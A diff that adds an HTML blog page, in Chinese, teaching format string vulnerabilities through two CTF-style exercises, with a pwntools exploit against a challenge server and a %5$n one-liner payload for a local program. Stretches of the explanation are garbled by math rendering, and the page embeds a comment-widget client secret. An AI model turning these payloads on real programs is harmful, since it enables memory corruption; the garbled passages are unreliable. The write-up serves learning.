@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta content="yes" name="apple-mobile-web-app-capable" />
+  <meta content="black" name="apple-mobile-web-app-status-bar-style" />
+  <meta name="referrer" content="never">
+  <meta name="keywords" content="">
+  <meta name="description" content="">
+  <meta name="author" content="kveln">
+  <title>Pwn(格式化字符串漏洞) |  </title>
+  <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+  <link rel="alternate" type="application/rss+xml" title="Pwn(格式化字符串漏洞) |   » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
+  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+    <meta property="og:description" content="Pwn(格式化字符串漏洞)"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/wJqAq8fzp/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content=" "/>
+  </head>
+  <body>
+  	<!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        Menu
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/">首页</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/archives">归档</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/post/about">关于</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/tags">分类</a>
+              
+          </li>
+          
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- Page Header -->
+  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+          	<span class="tags">
+          	 
+            <a href="https://guokeya.github.io/tag/Pwn/" class="tag">Pwn</a>
+            
+        </span>
+            <h1>Pwn(格式化字符串漏洞)</h1>
+            <span class="meta">
+            	Posted on
+              2020-01-04，5 min read
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <p>格式化字符串漏洞往往是由程序员错误使用格式化输出函数造成的。例如<br>
+print(s)</p>
+<!-- more -->
+<p>正常执行：<br>
+printf(&quot;%s%s&quot;,str1,str2)<br>
+<img src="https://guokeya.github.io/post-images/1578023187391.png" alt="" loading="lazy"><br>
+ebp，addr都是调用函数时的操作。然后传入参数，首先是格式化字符串。然后是参数<br>
+当格式化指针看到%时，就会找下面对应的值<br>
+第一个%s,就会将A打印出来。<br>
+第二个%s,就会将B打印出来。<br>
+非正常执行:<br>
+printf(s)<br>
+<img src="https://guokeya.github.io/post-images/1578023798622.png" alt="" loading="lazy"><br>
+也就是说。前面格式化字符串没了。只剩下了参数<br>
+但是把参数当成格式化字符串识别了<br>
+第一个%x会将后面的地址输出。第二个%x会将后面地址接着输出</p>
+<p>第一题：攻防世界CGfsb<br>
+首先ida反编译一下<br>
+<img src="https://guokeya.github.io/post-images/1577952597716.png" alt="" loading="lazy"><br>
+程序的整个运行流程是<br>
+read读取10个字节为buf<br>
+fgets读取100个字节为s<br>
+打印buf，打印s<br>
+比较pwnme==8<br>
+漏洞原理则是打印s的时候，语句为printf(&amp;s),因为printf不能指定有多少个参数<br>
+利用%10$n去修改pwnme的值<br>
+<img src="https://guokeya.github.io/post-images/1577952609516.png" alt="" loading="lazy"><br>
+pwnme的地址为0804A068<br>
+输入aaaa%x,回显结果为aaaa|地址|地址|地址...<br>
+可以看到，我们输入的aaaa，会在偏移10的地方出现<br>
+偏移10处，就写入我们的pwnme地址<br>
+前面写入%10n 前面只要8个字符，来配合n前面只要8个字符，来配合n<br>
+输入aaaa来保证第十处的地址是连在一起的，而不是分开在两个内存单元中<br>
+<img src="https://guokeya.github.io/post-images/1577952618413.png" alt="" loading="lazy"></p>
+<p>exp:</p>
+<pre><code>from pwn import *
+p = remote('111.198.29.45', 31559)
+pwnme = 0x0804A068
+payload2 = p32(pwnme) + 'aaaa%10$n'
+#先进后出原则，pwnme地址写前面进去栈
+p.recvuntil('please tell me your name:\n')
+p.sendline('aaaa')
+p.recvuntil('leave your message please:\n')
+p.sendline(payload2)
+print(p.recv())
+print(p.recv()) 
+</code></pre>
+<p>第二题:<br>
+源码如下</p>
+<pre><code>#include &lt;stdio.h&gt;
+int main(void){
+	int flag=0;
+	int *p=&amp;flag;
+	char a[100];
+	scanf(&quot;%s&quot;,a);
+	printf(a);
+	if (flag==2000){
+		printf(&quot;good!!\n&quot;);
+	}
+	return 0;
+}
+</code></pre>
+<p>gcc -g -fno-stack-protector -z execstack -o vuln vulnc.c<br>
+gdb看下汇编代码,给a了116个字节大小,然后调用print函数输出<br>
+<img src="https://guokeya.github.io/post-images/1578015096150.png" alt="" loading="lazy"><br>
+动态调试下<br>
+发现。输入的AAAA会在第5个地方保存<br>
+<img src="https://guokeya.github.io/post-images/1578015453710.png" alt="" loading="lazy"><br>
+堆栈的分布如下<br>
+<img src="https://guokeya.github.io/post-images/1578015650095.png" alt="" loading="lazy"><br>
+当我们输入AAAA|%x|%x|%1<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mi mathvariant="normal">时</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">程</mi><mi mathvariant="normal">序</mi><mi mathvariant="normal">输</mi><mi mathvariant="normal">出</mi><mi mathvariant="normal">如</mi><mi mathvariant="normal">下</mi><mo>!</mo><mo>[</mo><mo>]</mo><mo>(</mo><mi>h</mi><mi>t</mi><mi>t</mi><mi>p</mi><mi>s</mi><mo>:</mo><mi mathvariant="normal">/</mi><mi mathvariant="normal">/</mi><mi>g</mi><mi>u</mi><mi>o</mi><mi>k</mi><mi>e</mi><mi>y</mi><mi>a</mi><mi mathvariant="normal">.</mi><mi>g</mi><mi>i</mi><mi>t</mi><mi>h</mi><mi>u</mi><mi>b</mi><mi mathvariant="normal">.</mi><mi>i</mi><mi>o</mi><mi mathvariant="normal">/</mi><mi>p</mi><mi>o</mi><mi>s</mi><mi>t</mi><mo>−</mo><mi>i</mi><mi>m</mi><mi>a</mi><mi>g</mi><mi>e</mi><mi>s</mi><mi mathvariant="normal">/</mi><mn>1578015895756.</mn><mi>p</mi><mi>n</mi><mi>g</mi><mo>)</mo><mi mathvariant="normal">在</mi><mi mathvariant="normal">堆</mi><mi mathvariant="normal">栈</mi><mi mathvariant="normal">内</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">分</mi><mi mathvariant="normal">布</mi><mi mathvariant="normal">：</mi><mo>!</mo><mo>[</mo><mo>]</mo><mo>(</mo><mi>h</mi><mi>t</mi><mi>t</mi><mi>p</mi><mi>s</mi><mo>:</mo><mi mathvariant="normal">/</mi><mi mathvariant="normal">/</mi><mi>g</mi><mi>u</mi><mi>o</mi><mi>k</mi><mi>e</mi><mi>y</mi><mi>a</mi><mi mathvariant="normal">.</mi><mi>g</mi><mi>i</mi><mi>t</mi><mi>h</mi><mi>u</mi><mi>b</mi><mi mathvariant="normal">.</mi><mi>i</mi><mi>o</mi><mi mathvariant="normal">/</mi><mi>p</mi><mi>o</mi><mi>s</mi><mi>t</mi><mo>−</mo><mi>i</mi><mi>m</mi><mi>a</mi><mi>g</mi><mi>e</mi><mi>s</mi><mi mathvariant="normal">/</mi><mn>1578031833993.</mn><mi>p</mi><mi>n</mi><mi>g</mi><mo>)</mo><mi mathvariant="normal">因</mi><mi mathvariant="normal">为</mi><mi>A</mi><mi>A</mi><mi>A</mi><mi>A</mi><mi mathvariant="normal">代</mi><mi mathvariant="normal">表</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">的</mi></mrow><annotation encoding="application/x-tex">x时，程序输出如下
+![](https://guokeya.github.io/post-images/1578015895756.png)
+在堆栈内的分布：
+![](https://guokeya.github.io/post-images/1578031833993.png)
+因为AAAA代表是的%0
+%x代表的是下一个地址的16进制
+%x代表的是下下个地址的16进制
+%1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">x</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">程</span><span class="mord cjk_fallback">序</span><span class="mord cjk_fallback">输</span><span class="mord cjk_fallback">出</span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">下</span><span class="mclose">!</span><span class="mopen">[</span><span class="mclose">]</span><span class="mopen">(</span><span class="mord mathdefault">h</span><span class="mord mathdefault">t</span><span class="mord mathdefault">t</span><span class="mord mathdefault">p</span><span class="mord mathdefault">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">/</span><span class="mord">/</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">u</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">a</span><span class="mord">.</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">i</span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mord mathdefault">u</span><span class="mord mathdefault">b</span><span class="mord">.</span><span class="mord mathdefault">i</span><span class="mord mathdefault">o</span><span class="mord">/</span><span class="mord mathdefault">p</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord">/</span><span class="mord">1</span><span class="mord">5</span><span class="mord">7</span><span class="mord">8</span><span class="mord">0</span><span class="mord">1</span><span class="mord">5</span><span class="mord">8</span><span class="mord">9</span><span class="mord">5</span><span class="mord">7</span><span class="mord">5</span><span class="mord">6</span><span class="mord">.</span><span class="mord mathdefault">p</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mclose">)</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">堆</span><span class="mord cjk_fallback">栈</span><span class="mord cjk_fallback">内</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">分</span><span class="mord cjk_fallback">布</span><span class="mord cjk_fallback">：</span><span class="mclose">!</span><span class="mopen">[</span><span class="mclose">]</span><span class="mopen">(</span><span class="mord mathdefault">h</span><span class="mord mathdefault">t</span><span class="mord mathdefault">t</span><span class="mord mathdefault">p</span><span class="mord mathdefault">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">/</span><span class="mord">/</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">u</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">a</span><span class="mord">.</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">i</span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mord mathdefault">u</span><span class="mord mathdefault">b</span><span class="mord">.</span><span class="mord mathdefault">i</span><span class="mord mathdefault">o</span><span class="mord">/</span><span class="mord mathdefault">p</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord">/</span><span class="mord">1</span><span class="mord">5</span><span class="mord">7</span><span class="mord">8</span><span class="mord">0</span><span class="mord">3</span><span class="mord">1</span><span class="mord">8</span><span class="mord">3</span><span class="mord">3</span><span class="mord">9</span><span class="mord">9</span><span class="mord">3</span><span class="mord">.</span><span class="mord mathdefault">p</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mclose">)</span><span class="mord cjk_fallback">因</span><span class="mord cjk_fallback">为</span><span class="mord mathdefault">A</span><span class="mord mathdefault">A</span><span class="mord mathdefault">A</span><span class="mord mathdefault">A</span><span class="mord cjk_fallback">代</span><span class="mord cjk_fallback">表</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">的</span></span></span></span>x，代表的是第二个参数的值=第一个%x的值以16进制打印<br>
+所以当我们输入AAAA|%x|%x|%1<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mi mathvariant="normal">时</mi><mi mathvariant="normal">。</mi></mrow><annotation encoding="application/x-tex">x时。%1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">x</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">。</span></span></span></span>x会等于第二个参数的值<br>
+懂了原理。我们就可以把%1<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mi mathvariant="normal">换</mi><mi mathvariant="normal">成</mi></mrow><annotation encoding="application/x-tex">x换成%5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">x</span><span class="mord cjk_fallback">换</span><span class="mord cjk_fallback">成</span></span></span></span>n<br>
+为什么是%5呢。因为%5我们可控。<br>
+<img src="https://guokeya.github.io/post-images/1578032187272.png" alt="" loading="lazy"><br>
+可以看到。我们输入的AAAA。会在%5<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">的</mi><mi mathvariant="normal">地</mi><mi mathvariant="normal">址</mi><mi mathvariant="normal">出</mi><mi mathvariant="normal">现</mi><mi mathvariant="normal">。</mi><mi mathvariant="normal">如</mi><mi mathvariant="normal">果</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">一</mi><mi mathvariant="normal">个</mi><mi mathvariant="normal">地</mi><mi mathvariant="normal">址</mi><mi mathvariant="normal">。</mi><mi mathvariant="normal">配</mi><mi mathvariant="normal">置</mi><mi>p</mi><mi>r</mi><mi>i</mi><mi>n</mi><mi>t</mi><mi>f</mi><mi mathvariant="normal">根</mi><mi mathvariant="normal">据</mi><mi mathvariant="normal">源</mi><mi mathvariant="normal">码</mi><mi mathvariant="normal">。</mi><mi mathvariant="normal">我</mi><mi mathvariant="normal">们</mi><mi mathvariant="normal">需</mi><mi mathvariant="normal">要</mi><mi mathvariant="normal">满</mi><mi mathvariant="normal">足</mi><mi>f</mi><mi>l</mi><mi>a</mi><mi>g</mi><mo>=</mo><mn>2000</mn><mi mathvariant="normal">那</mi><mi mathvariant="normal">么</mi><mi mathvariant="normal">思</mi><mi mathvariant="normal">路</mi><mi mathvariant="normal">就</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">第</mi><mi mathvariant="normal">一</mi><mi mathvariant="normal">个</mi><mi mathvariant="normal">参</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">。</mi><mi mathvariant="normal">是</mi><mi>f</mi><mi>l</mi><mi>a</mi><mi>g</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">地</mi><mi mathvariant="normal">址</mi><mi mathvariant="normal">第</mi><mi mathvariant="normal">二</mi><mi mathvariant="normal">个</mi><mi mathvariant="normal">参</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">。</mi><mi mathvariant="normal">满</mi><mi mathvariant="normal">足</mi><mi mathvariant="normal">长</mi><mi mathvariant="normal">度</mi><mn>2000</mn><mi mathvariant="normal">第</mi><mi mathvariant="normal">三</mi><mi mathvariant="normal">个</mi><mi mathvariant="normal">参</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">。</mi><mi mathvariant="normal">将</mi><mi mathvariant="normal">前</mi><mi mathvariant="normal">面</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">所</mi><mi mathvariant="normal">有</mi><mi mathvariant="normal">字</mi><mi mathvariant="normal">符</mi><mi mathvariant="normal">长</mi><mi mathvariant="normal">度</mi><mi mathvariant="normal">输</mi><mi mathvariant="normal">出</mi><mi mathvariant="normal">到</mi></mrow><annotation encoding="application/x-tex">的地址出现。如果是一个地址。配置printf%n参数写入即可造成任意地址读写
+根据源码。我们需要满足flag=2000
+那么思路就是
+第一个参数。是flag的地址
+第二个参数。满足长度2000
+第三个参数。将前面的所有字符长度输出到%5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">地</span><span class="mord cjk_fallback">址</span><span class="mord cjk_fallback">出</span><span class="mord cjk_fallback">现</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">果</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">地</span><span class="mord cjk_fallback">址</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">配</span><span class="mord cjk_fallback">置</span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord cjk_fallback">根</span><span class="mord cjk_fallback">据</span><span class="mord cjk_fallback">源</span><span class="mord cjk_fallback">码</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">需</span><span class="mord cjk_fallback">要</span><span class="mord cjk_fallback">满</span><span class="mord cjk_fallback">足</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord cjk_fallback">那</span><span class="mord cjk_fallback">么</span><span class="mord cjk_fallback">思</span><span class="mord cjk_fallback">路</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">第</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">参</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">是</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">地</span><span class="mord cjk_fallback">址</span><span class="mord cjk_fallback">第</span><span class="mord cjk_fallback">二</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">参</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">满</span><span class="mord cjk_fallback">足</span><span class="mord cjk_fallback">长</span><span class="mord cjk_fallback">度</span><span class="mord">2</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord cjk_fallback">第</span><span class="mord cjk_fallback">三</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">参</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">将</span><span class="mord cjk_fallback">前</span><span class="mord cjk_fallback">面</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">字</span><span class="mord cjk_fallback">符</span><span class="mord cjk_fallback">长</span><span class="mord cjk_fallback">度</span><span class="mord cjk_fallback">输</span><span class="mord cjk_fallback">出</span><span class="mord cjk_fallback">到</span></span></span></span>n，也就是写入到flag的地址<br>
+payload如下:<br>
+python -c &quot;print '\xa8\xd0\xff\xff%.1996x%5$n'&quot;&gt;11<br>
+cat 11|./vuln2<br>
+<img src="https://guokeya.github.io/post-images/1578032920911.png" alt="" loading="lazy"></p>
+
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/hwKOeu6uW/">
+              <span class="post-title">
+                [极客大挑战 2019]RCE ME(无数字字母Webshell)&rarr;
+              </span>
+            </a>
+          </p>
+        
+        <div class="comment">
+          
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<div id="gitalk-container"></div>
+<script>
+  var gitalk = new Gitalk({
+    clientID: 'c07e068ab9501a423854',
+    clientSecret: '33e8ada317c799c9a4ca5cbbb2070ff5a423903b',
+    repo: 'Message',
+    owner: 'guokeya',
+    admin: ['guokeya'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+  gitalk.render('gitalk-container')
+</script>
+
+          
+          
+        
+        </div>
+      </div>
+    </div>
+  </article>
+ <!-- Footer -->
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <ul class="list-inline text-center">
+            
+            
+            <li class="list-inline-item">
+              <a href="http://github.com/guokeya" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+              <li class="list-inline-item">
+              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+              </li>
+          </ul>
+          <p class="copyright text-muted">Copyright &copy;<span> </span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea<br >浙ICP备2021000950号-1</a></p>
+        </div>
+      </div>
+    </div>
+   </footer>
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+  <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
+<a id="back_to_top" href="#" class="back_to_top">
+  <span>▲</span></a>
+<script>$(document).ready((function(_this) {
+    return function() {
+      var bt;
+      bt = $('#back_to_top');
+      if ($(document).width() > 480) {
+        $(window).scroll(function() {
+          var st;
+          st = $(window).scrollTop();
+          if (st > 30) {
+            return bt.css('display', 'block')
+          } else {
+            return bt.css('display', 'none')
+          }
+        });
+        return bt.click(function() {
+          $('body,html').animate({
+            scrollTop: 0
+          },
+          800);
+          return false
+        })
+      }
+    }
+  })(this));</script>
+  </body>
+</html>
+
